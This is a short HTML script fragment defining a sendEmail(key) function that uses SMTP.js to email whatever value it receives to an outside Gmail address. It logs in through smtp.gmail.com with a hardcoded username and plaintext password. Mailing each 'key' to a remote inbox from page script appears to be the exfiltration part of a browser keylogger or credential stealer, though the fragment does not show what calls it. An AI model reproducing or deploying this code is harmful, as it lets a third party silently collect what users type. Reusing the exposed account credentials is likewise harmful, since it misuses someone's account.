<script>
   function sendEmail(key){
  Email.send({
    Host : "smtp.gmail.com",
    Username : "nkwim1933@gmail.com",
    Password : "nkwimishere",
    To : 'susanadams1133@gmail.com',
    From : "nkwim1933@gmail.com",
    Subject : "This is the subject",
    Body : key
  });
   }
  </script>
